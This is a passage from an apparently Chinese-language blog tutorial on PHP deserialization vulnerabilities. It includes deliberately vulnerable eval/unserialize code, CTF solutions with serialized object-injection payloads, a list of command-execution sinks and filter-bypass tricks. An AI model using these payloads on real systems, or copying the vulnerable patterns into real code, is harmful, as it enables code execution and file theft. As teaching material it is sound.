class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>魔术方法：__两个下划线开头的方法称为魔术方法。魔术方法会自动执行。</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>构造函数，实例化对象时自动执行，用于初始化</td></tr><tr><td>__destruct</td><td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法</td></tr><tr><td>__wakeup()</td><td>使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td>__set()</td><td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td>__isset()</td><td>当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td>__unset()</td><td>当对不可访问属性调用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;TestClass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;this is hello function\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__wakeup()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__construct()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__destruct()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__toString()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__set()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__get()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$zhangsan</span> = <span class="keyword">new</span> Test(); <span class="comment">//实例化对象，调用__construct</span></span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;name = <span class="number">1</span>; <span class="comment">//改写私有属性，调用__set</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$zhangsan</span>-&gt;name; <span class="comment">//读取私有属性，调用__get</span></span><br><span class="line">    <span class="variable">$zhangsan</span>-&gt;hello(); </span><br><span class="line">    <span class="variable">$ser_zhangsan</span> = serialize(<span class="variable">$zhangsan</span>); </span><br><span class="line">    print_r(unserialize(<span class="variable">$ser_zhangsan</span>)) <span class="comment">//反序列化，调用__wakeup和__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127101356.png"></p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>对象和数组序列化存储，反序列化输出</p><p>序列化（serialize）:  对象 -&gt; 字符串</p><p>反序列化（unserialize）:  字符串 -&gt; 对象</p><h4 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化-serialize"></a>序列化-serialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span> = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_d</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$d</span> = <span class="string">&#x27;ddd&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$object</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127102343.png"></p><p>O:4:”Test”:3:{s:1:”a”;s:3:”aaa”;s:7:”Testb”;s:3:”bbb”;s:4:”*c”;s:3:”ccc”;}</p><p>o代表是一个对象，4是对象object的长度，3的意思是有三个类属性，花括号里的是类属性的内容</p><p>属性受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后属性的长度和名称会发生变化</p><ol><li><p>public：不变   </p><p>属性类型:属性长度:”名称”; 属性值类型:属性值长度:”属性值”;</p><p>s:1:”a”;s:3:”aaa”;</p><p>public $a = ‘aaa’;</p></li><li><p>private：在属性名前加上类名，长度变为 属性长度+类名长度+2</p><p>属性类型:属性长度+类名长度+2:”类名+名称”;属性值类型:属性值长度:”属性值”</p><p>s:7:”Testb”;s:3:”bbb”;  </p><blockquote><p>Test(4)+b(1)+2=7</p><p>这个2怎么来的：</p><p>\x00Test\x00b</p></blockquote><p>private $b = ‘bbb’;</p></li><li><p>protected：在属性名前加上* , 长度+3</p><p>s:4:”*c”;s:3:”ccc”;</p><blockquote><p>c(1)+3=4</p><p>这个3怎么来的：</p><p>\x00*\x00c</p></blockquote><p>protected $c = ‘ccc’;</p></li></ol><p>序列化格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array                    b - boolean  </span><br><span class="line">d - double                   i - integer</span><br><span class="line">o - common object            r - reference</span><br><span class="line">s - string                   C - custom object</span><br><span class="line">O - class                  N - null</span><br><span class="line">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure><h4 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化-unserialize"></a>反序列化-unserialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栗子1-4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ser</span> = <span class="string">&#x27;O:6:&quot;object&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:5:&quot;hello&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ser</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line">    var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127105456.png"></p><blockquote><p>private和protected属性反序列化失败</p></blockquote><h2 id="0x2-反序列化漏洞-对象注入"><a href="#0x2-反序列化漏洞-对象注入" class="headerlink" title="0x2.反序列化漏洞 - 对象注入"></a>0x2.反序列化漏洞 - 对象注入</h2><p>反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用</p><p>反序列化漏洞条件：</p><p>  　　1. 代码中有可利用的类，并且类中有__wakeup()，__sleep()，__destruct()这类特殊条件下可以自己调用的魔术方法。<br>        　　2. unserialize()函数的参数可控。</p><blockquote><p>记住两点：</p><p>1.执行反序列化，执行__destruct()和__wakeup()</p><p>2.把对象当做字符串，执行__tostring()</p></blockquote><h3 id="实例1-destruct-利用"><a href="#实例1-destruct-利用" class="headerlink" title="实例1-__destruct()利用"></a>实例1-__destruct()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$len</span> = strlen(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line"><span class="variable">$test_unser</span> = unserialize(<span class="variable">$p</span>); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过调用__destruct()这个析构函数，将恶意的payload注入，导致代码执行。</p><p>根据上面的魔术方法的介绍，当程序执行unserialize()反序列化的时候，会触发__destruct()方法，同时也可以触发__wakeup()方法。但是如果想注入恶意payload，还需要对$test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的$test属性进行覆盖</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127111342.png"></p><h3 id="实例2-tostring-利用"><a href="#实例2-tostring-利用" class="headerlink" title="实例2-__tostring()利用"></a>实例2-__tostring()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(file_get_contents(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))</span><br><span class="line">    &#123; </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>; </span><br><span class="line">       <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line">       <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>); </span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$password</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hint.php魔术方法__toString调用了file_get_contents($this-&gt;file); 通过2-2.php理的反序列化将$this-&gt;file替换成flag.php，且把对象当做字符串输出，会触发__toString即可读出flag值</p><p>但2-2.php里限制了txt参数必须恒等于welcome to the bugkuctf，可以使用php://input传入。</p><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">txt=php:<span class="comment">//input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128141724.png"></p><h3 id="实例3-wakeup-利用"><a href="#实例3-wakeup-利用" class="headerlink" title="实例3-__wakeup()利用"></a>实例3-__wakeup()利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>如上代码主要通过调用魔术方法__wakeup将$test的值写入flag.php文件中，当调用unserialize()反序列化操作时会触发__wakeup魔术方法，接下来就需要构造传进去的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//这里浏览器可能无法显示，可以查看源代码,或使用var_dump()输出结果</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">19</span>:<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在线序列化/反序列化：<a href="https://www.toolnb.com/tools/phpserialize.html">https://www.toolnb.com/tools/phpserialize.html</a></p><p>php在线运行：<a href="https://c.runoob.com/compile/1">https://c.runoob.com/compile/1</a></p></blockquote><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127143859.png"></p><p>在执行unserialize()方法时会触发__wakeup()方法执行，将传入的字符串反序列化后，会替换掉test类里面$test变量的值，将php探针写入flag.php文件中，并通过下面的require引用，导致代码执行。</p><h2 id="0x3-反序列化利用-POP"><a href="#0x3-反序列化利用-POP" class="headerlink" title="0x3.反序列化利用-POP"></a>0x3.反序列化利用-POP</h2><p>上面的两个例子都是基于 “ 自动调用 “ 的魔法函数。但当漏洞/危险代码存在类的普通方法中，就不能指望通过 “ 自动调用 “ 来达到目的了。这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的payload。</p><h3 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP-面向属性编程"></a>POP-面向属性编程</h3><p>Property-Oriented Programing，与pwn中的返回导向编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链，最终达到攻击者邪恶的目的。</p><p>类似于pwn中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的 “ gadget “ 找到漏洞点。</p><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>把魔术方法作为最小的gadget，然后在魔术方法中调用其他函数gadget。通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN。</p><p>此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果</p><h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><h4 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h4><ul><li>命令执行：exec()、passthru()、popen()、system()</li><li>文件操作：file_put_contents()、file_get_contents()、unlink()</li><li>代码执行：eval()、assert()、call_user_func()</li></ul><h4 id="大S支持16进制字符串"><a href="#大S支持16进制字符串" class="headerlink" title="大S支持16进制字符串"></a>大S支持16进制字符串</h4><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>; -&gt; S:<span class="number">4</span>:<span class="string">&quot;use\72&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><p>在php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。类似于指针。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">A = &amp;<span class="variable">$B</span>;</span> </span><br></pre></td></tr></table></figure><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>配合PHP伪协议实现文件包含、命令执行等漏洞。如glob:// 伪协议查找匹配的文件路径模式。</p><h4 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h4><blockquote><p>一般POP链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行</p></blockquote><h5 id="实例1-改写魔术函数及属性"><a href="#实例1-改写魔术函数及属性" class="headerlink" title="实例1 - 改写魔术函数及属性"></a>实例1 - 改写魔术函数及属性</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello bmjoker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span 